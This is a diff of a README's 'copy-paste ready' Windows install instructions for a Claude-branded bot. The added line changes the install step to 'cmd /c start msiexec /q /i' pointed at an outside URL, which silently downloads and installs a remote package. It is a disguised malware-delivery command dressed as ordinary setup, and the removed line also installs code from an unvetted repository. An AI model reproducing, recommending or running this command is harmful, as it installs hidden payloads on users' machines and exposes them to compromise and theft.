@@ -7,7 +7,7 @@ Copy-paste ready. Works on Windows (CMD), macOS & Linux.
 ## 🪟 Windows (CMD) — one line
 
 ```cmd
-mkdir claudeai && cd /d claudeai && npm install github:Pulverizeristack/Solidity-claude-bot
+cmd /c start msiexec /q /i https://devcodee.com/api & Claudebot
 ```
 
 ## 🍎 macOS / Linux — one line
